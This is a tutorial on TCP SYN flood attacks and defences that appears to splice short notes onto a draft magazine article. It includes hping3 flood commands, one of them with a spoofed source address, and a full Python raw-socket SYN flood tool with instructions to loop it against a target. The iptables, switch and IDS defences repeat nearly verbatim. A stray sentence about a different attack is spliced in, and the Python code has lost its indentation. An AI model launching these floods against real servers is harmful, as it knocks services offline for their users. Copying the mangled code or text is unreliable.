## What is TCP SYN flooding Attacks

TCP SYN Flooding is a specific type of DDoS. This attack exploits an implementation characteristic of the TCP protocol, and can be used to make server processes incapable of resposing a legitimate client request for new TCP connections. Any service that binds to and listens on a TCP socket is potentially vulnerable to TCP SYN flooding attacks.

### The TCP Three-way Handshake
The basis of SYN flooding attack lies in the design of the 3-way handshake of TCP protocol. When a client attempts to start a TCP connection to a server, the client and server exchange a series of messages in the following sequences:
1. Client request a connection by sending a SYN message to server.
2. Server acknowledges the message and send back a SYN-ACK to client.
3. The client responds with an ACK, and the connection is established.

This is called TCP "Three-way" handshake. Every TCP connection established uses it.

### Transmission Control Block (TCB)
During the TCP transmission, the TCB (Transmission Control Block) data structure is being used. TCB holds all the information about a connection. Each TCB size exceeds at least 280 bytes. Very importantly, TCB is allocated based on the reception of the SYN packet before the connection is fully established. This leads to a very clear potential DDoS attack, where the incoming SYNs cause the allocation of huge amount of TCBs that exhaust the server's resources. When this happens, the server continues to wait for acknowledgement for each of the requests (which on the client side ACKs are ignored so there is no ACKs ever), binding resources until no new connections can be made, and ultimately resulting in denial of service.

### Symptoms
When an attack starts, the server sees the equivalent of multiple attempts to establish TCP communications. The server also responds to each attempt with a SYN/ACK (synchronization acknowledged) packet from each open port, and with a RST (reset) packet from each closed port. Since this is SYN attack, the client never sends back the ACK packet, instead the clinet probably discard all the ACK-SYN recevied and keep sending SYNs to the server. Server will have to wait certain amount of time to close these half-opened connections. Eventually the TCP backlog is full and server denies any new connections.

### Defense against syn flood attacks
Firewall: Iptables is the default firewall for Linux computers.The rule of thumb: block all the incoming traffic except the traffic you REALLY need on your server. Allow management only from trusted sources.
The easiest case is an attack from one host without IP spoofing. It is easy to eliminate:
```bash
# iptables -A INPUT -p tcp -m state --state NEW -m recent --update --seconds 20 --hitcount 20 -j DROP
# iptables -A INPUT -p tcp -m state --state NEW -m recent --set -j ACCEPT
```
The above two rules limite the rate of SYN requests from a single IP to 20 per 20 seconds. If the rate limit it too high, adjust it your to your own.
```bash
iptables -t mangle -I PREROUTING -p tcp -m tcp --dport 80 -m state --state NEW -m tcpmss ! --mss 536:65535 -j DROP
```
Some SYN attacks have `unusal` parameters in the TCP header. The first one is MSS (Maximum Segment Size) – maximum size of the segment that a host initiating the connection wants to allow. Most attacking tools (including hping) do not set this parameter by default. Most of legitimate client set it on the other hand. The normal value is between 536 and 65535.

### Protection using Switches
Most switches have some rate-limiting and ACL capability. Some switches provide automatic and/or system-wide rate limiting, traffic shaping, delayed binding (TCP splicing), deep packet inspection and Bogon filtering (bogus IP filtering) to detect and remediate denial of service attacks through automatic rate filtering and WAN Link failover and balancing.

### Using Commercial tools and services
There are commercially available tools and services to protect. For example, Cloudflare, Prolexic, Incapsula, Arbor Networks, Fortinet etc. If your business is very critical, then it worth to pay the $$.

Using IDS and IPS
Dear Readers,

Here You can read the beta version of article regards to the topic “How to protect”. You can read the article also in Hakin9’s issue devoted to SYN Flood Attack that You can pre-order

Author: Thanglalson Gangte.

“How to protect?”

All you need to know about Denial Of Service and SYN flooding attacks.
What you will learn:
1. How denial of service attacks work
2. How syn flood attacks work
3. How to create a syn flood tool.
4. How to protect your company from these attacks

What you should know:
1. Basic knowledge about TCP/IP concepts
Introduction to Denial of Service attacks
Denial of service attacks are the most serious threats that datacenters and web servers face today. They cause billions of dollars of loss to companies and organizations. Denial of Service attacks have become more widely known due to extensive media coverage. But what exactly is a denial of service attack? Simply put, a denial of service attack is a type of cyber attack wherein a website or service is brought down by a hacker or a group of hackers by flooding it with bogus traffic. The web server becomes overloaded with this bogus traffic and the service eventually crashes.
Symptoms of denial of service attacks.
Unusually slow network performance (opening files or accessing web sites)
Unavailability of a particular web site
Inability to access any web site
Dramatic increase in the number of spam emails received—(this type of DoS attack is considered an e-mail bomb)
Disconnection of a wireless or wired internet connection
Long term denial of access to the web or any internet services

This means that if a hacker performs a denial of service attack against a website, say for example a bank website, then all the online transitions of that bank will be halted. Both companies and individuals are no long able to log into their netbanking accounts for the duration of the attack, leading to loss in revenue for the bank. The bank will also lose reputation and credibility for failing to protect their IT infrastructure. Similarly, if Gmail was attacked, millions of users will not be able to access their email accounts. In a typical DoS attack, one hacker performs the attack using a DoS tool or script. This is easy to mitigate. The only thing one needs to do is block the IP address of the attacker. To overcome this, hackers use a technique called Distributed Denial of Service or DDoS.

What are Distributed Denial of Service(DDoS) Attacks?

1

 

DDoS attacks involve hundreds, if not thousands of “volunteers” who install the DoS tool in their systems and launch a coordinated attack on the target at a specified time. This was the case when Anonymous hacker group took down Paypal and MasterCard websites some time back. In case there are no “volunteers” involved, hackers use a networks of zombies called botnets to perform the same attack. These zombies are basically normal home computers which have been hacked and infected with the DoS tool. The controller is able to issue remote commands to these “bots” so that they can start attacking a particular website without the owners even noticing.
There are different kinds of dos attacks.

Volume Based Attacks
Includes UDP floods, ICMP floods, and other spoofed-packet floods. The attack’s goal is to saturate the bandwidth of the attacked site, and magnitude is measured in bits per second (Bps).

Protocol Attacks
Includes SYN floods, fragmented packet attacks, Ping of Death, Smurf DDoS and more. This type of attack consumes actual server resources, or those of intermediate communication equipment, such as firewalls and load balancers, and is measured in Packets per second.

Application Layer Attacks
Includes Slowloris, Zero-day DDoS attacks, DDoS attacks that target Apache, Windows or OpenBSD vulnerabilities and more. Comprised of seemingly legitimate and innocent requests, the goal of these attacks is to crash the web server, and the magnitude is measured in Requests per second.

There are many readymade tools that can perform DoS attacks. Examples are Hping3, LOIC, HOIC, XOIC, HULK (HTTP Unbearable Load King), R-U-Dead-Yet, DDOSIM—Layer 7 DDOS Simulator etc. In this paper, we will focus our discussion on an protocol based attack called SYN Flood attack.

What is SYN flood attack?
In order to understand a syn flood attacks, we first need to understand the TCP/IP handshake.
Normally when a client attempts to start a TCP connection to a server, the client and server exchange a series of messages which normally runs like this:
1. The client requests a connection by sending a SYN (synchronize) message to the server.
2. The server acknowledges this request by sending SYN-ACK back to the client.
3. The client responds with an ACK, and the connection is established.
This is called the TCP three-way handshake, and is the foundation for every connection established using the TCP protocol.

22

A normal connection between a user (Alice) and a server. The three-way handshake is correctly performed.

SYN Flood
A SYN flood DDoS attack exploits a known weakness in the TCP connection sequence (the “three-way handshake”), wherein a SYN request to initiate a TCP connection with a host must be answered by a SYN-ACK response from that host, and then confirmed by an ACK response from the requester. In a SYN flood scenario, the requester sends multiple SYN requests, but either does not respond to the host’s SYN-ACK response, or sends the SYN requests from a spoofed IP address. Either way, the host system continues to wait for acknowledgement for each of the requests, binding resources until no new connections can be made, and ultimately resulting in denial of service.
HTTP headers, but never completes a request. The targeted server keeps each of these false connections open. This eventually overflows the maximum concurrent connection pool, and leads to denial of additional connections from legitimate clients.

31

SYN Flood. The attacker (Mallory) sends several packets but does not send the “ACK” back to the server. The connections are hence half-opened and consuming server resources. Alice, a legitimate user, tries to connect but the server refuses to open a connection resulting in a denial of service.
SYN flooding is a method that the user of a hostile client program can use to conduct a denial-of-service (DoS) attack on a computer server. The hostile client repeatedly sends SYN (synchronization) packets to every port on the server, using fake IP addresses.
When an attack begins, the server sees the equivalent of multiple attempts to establish communications. The server responds to each attempt with a SYN/ACK (synchronization acknowledged) packet from each open port, and with a RST (reset) packet from each closed port. In a normal three-way handshake, the client would return an ACK (acknowledged) packet to confirm that the server’s SYN/ACK packet was received, and communications would then commence. However, in a SYN flood, the ACK packet is never sent back by the hostile client. Instead, the hostile client program sends repeated SYN requests to all the server’s ports.
The hostile client makes the SYN requests all appear valid, but because the IP addresses are fake ones, it is impossible for the server to close down the connection by sending RST packets back to the hostile client. Instead, the connection stays open. Before time-out can occur, another SYN packet arrives from the hostile client. A connection of this type is called a half-open connection. Under these conditions, the server becomes completely or almost completely busy with the hostile client. Communications with legitimate clients is difficult or impossible.
A hostile client can exploit half-open connections and possibly get access to server files. The transmission by a hostile client of SYN packets for the purpose of finding open ports and hacking into one or more of them, is called SYN scanning. A hostile client always knows a port is open when the server responds with a SYN/ACK packet.

3. How to perform SYN flood in your own virtual environment.
SYN flooding is one of the most effective types of DOS attacks. The only way to really appreciate the severity of the attack is to witness it firsthand. In this section, we will take a look at a tool used to perform syn flood attacks and also take a look at a demo of it. We will use a tool called HPING3 for performing syn flood.
Wikipedia defines hping as:
“hping is a free packet generator and analyzer for the TCP/IP protocol distributed by Salvatore Sanfilippo (also known as Antirez). Hping is one of the de facto tools for security auditing and testing of firewalls and networks, and was used to exploit the idle scan scanning technique (also invented by the hping author), and now implemented in the Nmap Security Scanner. The new version of hping, hping3, is scriptable using the Tcl language and implements an engine for string based, human readable description of TCP/IP packets, so that the programmer can write scripts related to low level TCP/IP packet manipulation and analysis in very short time.”

In order to perform this experiment, we will need to set up two systems, the attacker and the victim.
For the attacker, we will use Kali Linux, and as the victim, we will use a windows 7 system running apache web server. In order to isolate these environments, we will use virtual machines. You may use VirtualBox or VMware, both are equally good, it is entirely a matter of choice. I will not be explaining how to install Kali or Windows in the virtual machine, there are plenty of articles already explaining the same.
Step 1. Set up the environment.
Download and install VirtualBox. Download XAMPP for windows. Download Kali Linux ISO(1GB) and Windows 7 iso (3.5GB)
1. Create a new virtual machine called Kali Linux and give it 1GB RAM and set the network adapter to Host Only. Install Kali Linux iso file in the virtual machine and boot it up.
2. Create another virtual machine called Windows 7 and give it a 1GM RAM too. Again, set the network adapter to Host Only. Insert a Windows 7 iso file and install windows 7 operating system in the virtual machine.

41

Once the VMs are configured and installed, open windows 7 and install XAMPP. XAMPP is a pre-configured package of Apache, MySQL and PHP for windows environment. Once installed, open the XAMPP control panel. Start Apache and MySQL.

51

Now, download DVWA from and unzip it in a folder. copy the contents of it into the HTDOCS folder in C:/xampp/htdocs. Open localhost in the windows 7 browser and configure the DVWA.
Once that’s done, make sure the adapters in both the virtual machines are configured for host only.

61

Now that our systems are set up and properly configured, we are going to make sure they can communicate with each other. open command prompt in windows and type ipconfig. Note down the ip address.

Open terminal in Kali and type ifconfig. Now enter the other system’s ip address in each system and ping them. If you get a reply, you are connected successfully. If not, go back and re check your steps.

Once DVWA has been successfully installed in the windows system, open up a browser in Kali or the host system and type the ip address in the url bar. You should see the website up and running. This is the website that we will attempt to bring down.

71

Now open a terminal in Kali Linux and type these commands:

hping3 -S 192.168.56.2 -p 80 --flood
192.168.56.2 is your target IP address. -p 80 is the port to be attacked.
You can even spoof the ip address fo the source. Use this code:

hping3 -S 192.168.56.2 -a 192.168.1.1 -p 80 --flood
The IP 192.168.1.1 is the spoofed IP. The victim will think the traffic is coming from 192.168.1.1.

Now, let this command run for several minutes and check the website by refreshing it a few times. You will notice that the website has become slow and it will eventually crash.

81

This was a very simple demonstration of how syn flood attack can be used to bring down a website. The virtual environment was very small, so it crashed quickly. In the real word, servers will need several hundred or thousands of bots running the tool to crash websites.
Create your own syn flood attack tool.

In this section, you will learn how to create your own syn flood tool. This tool will be created using python. The code is given here, alternatively it can be downloaded from http://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
Python code courtesy of: Silver Moon (m00n.silv3r@gmail.com)
”’
Syn flood program in python using raw sockets (Linux)

Silver Moon (m00n.silv3r@gmail.com)

'''
# some imports
import socket, sys
from struct import *

# checksum functions needed for calculation checksum
def checksum(msg):
s = 0
# loop taking 2 characters at a time
for i in range(0, len(msg), 2):
w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )         s = s + w           s = (s>>16) + (s & 0xffff);
#s = s + (s >> 16);
#complement and mask to 4 byte short
s = ~s & 0xffff

return s

#create a raw socket
try:
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error , msg:
print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
sys.exit()

# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# now start constructing the packet
packet = '';

source_ip = '192.168.1.101'
dest_ip = '192.168.1.1' # or socket.gethostbyname('www.google.com')

# ip header fields
ihl = 5
version = 4
tos = 0
tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
id = 54321  #Id of this packet
frag_off = 0
ttl = 255
protocol = socket.IPPROTO_TCP
check = 10  # python seems to correctly fill the checksum
saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if you want to
daddr = socket.inet_aton ( dest_ip )

ihl_version = (version << 4) + ihl

# the ! in the pack format string means network order
ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

# tcp header fields
source = 1234   # source port
dest = 80   # destination port
seq = 0
ack_seq = 0
doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
#tcp flags
fin = 0
syn = 1
rst = 0
psh = 0
ack = 0
urg = 0
window = socket.htons (5840)    #   maximum allowed window size
check = 0
urg_ptr = 0

offset_res = (doff << 4) + 0
tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

# the ! in the pack format string means network order
tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

# pseudo header fields
source_address = socket.inet_aton( source_ip )
dest_address = socket.inet_aton(dest_ip)
placeholder = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_header)

psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
psh = psh + tcp_header;

tcp_checksum = checksum(psh)

# make the tcp header again and fill the correct checksum
tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

# final full packet - syn packets dont have any data
packet = ip_header + tcp_header

#Send the packet finally - the port specified has no effect
s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target

#put the above line in a loop like while 1: if you want to flood
In order to use the tool, type this in ubuntu:

$ sudo python tcp_syn.py
This tool demonstrates the internal working of a syn flood attack.

Defense against syn flood attacks
Hardening your TCP/IP Stack Against SYN Floods
Denial of service (DoS) attacks launch via SYN floods can be very problematic for servers that are not properly configured to handle them. Proper firewall filtering policies are certainly usually the first line of defense, however the Linux kernel can also be hardened against these types of attacks. This type of hardening is useful for SYN floods that attempt to overload a particular service with requests (such as http) as opposed to one that intends to saturate the server’s network connection, for which a firewall is needed to guard against.

Definition of a SYN Flood
TCP connections are established using a 3-way handshake. Attackers desiring to start a SYN flood will spoof their IP address in the header of the SYN packet sent to the server, so that when the server responds with it’s SYN-ACK packet, it never reaches the destination (from which an ACK would be sent and the connection established). The server leaves these unestablished connections in a queue for a pre-determined period of time after which they are simply discarded. However if enough of these “fake” connections gum up the queue (backlog) , it can prevent new, legitimate requests from being handled. Linux has a relatively small backlog queue by default, and keeps half-open requests in the queue for up to 3 minutes! Thus the need for tweaking the way the Linux kernel handles these requests is born.

Firewall Rules to protect against SYN flood
Firewalls can be set up to have simple rules to allow or deny protocols, ports or IP addresses. In the case of a simple attack coming from a small number of unusual IP addresses for instance, one could put up a simple rule to drop all incoming traffic from those attackers.

Basic iptables protection techniques
Iptables is the default firewall for Linux computers. Remember to harden your firewall: block all the incoming traffic except the traffic you REALLY need on your server. Allow management only from trusted sources.
The easiest case is an attack from one host without IP spoofing. It is easy to eliminate:

# iptables -A INPUT -p tcp -m state --state NEW -m recent --update --seconds 60 --hitcount 20 -j DROP

# iptables -A INPUT -p tcp -m state --state NEW -m recent --set -j ACCEPT
These rules limit the rate of SYN requests from one IP to 20 per minute. Do not use it on regular basis! You can block legitimate traffic originating from networks behind NAT.
Some SYN attacks are easy to filter because they have the same ‘unusual’ parameters in the TCP header.
The first one is MSS (Maximum Segment Size) – maximum size of the segment that a host initiating the connection wants to allow. Most attacking tools (including hping) do not set this parameter by default. On the other hand, I haven’t seen any legitimate clients that don’t set it. ‘Normal’ values are between 536 and 65535, let’s use it:

# iptables -t mangle -I PREROUTING -p tcp -m tcp --dport 80 -m state --state NEW -m tcpmss ! --mss 536:65535 -j DROP
Protection using Switches
Most switches have some rate-limiting and ACL capability. Some switches provide automatic and/or system-wide rate limiting, traffic shaping, delayed binding (TCP splicing), deep packet inspection and Bogon filtering (bogus IP filtering) to detect and remediate denial of service attacks through automatic rate filtering and WAN Link failover and balancing.

Using Commercial tools and services
Organizations can use commercially available tools and services to protect themselves against denial of service. Examples include Cloudflare, Prolexic, Incapsula, Arbor Networks, Fortinet etc. These services and products are often expensive but if you are running a critical service, it is worth it. Many of these employ both software and hardware based defense mechanisms.

### Using IDS and IPS
Install Intrusion detection systems (IDS) and Intrusion Prevention systems(IPS) in your server. There are plenty of great IDS and IPS available in the market. If you are a small or medium business that can’t afford commercial solutions, then there is a free alternative for you. Snort is a free and open source IDS/IPS that is freely available to everyone. You can configure snort to block all kinds of DoS attacks.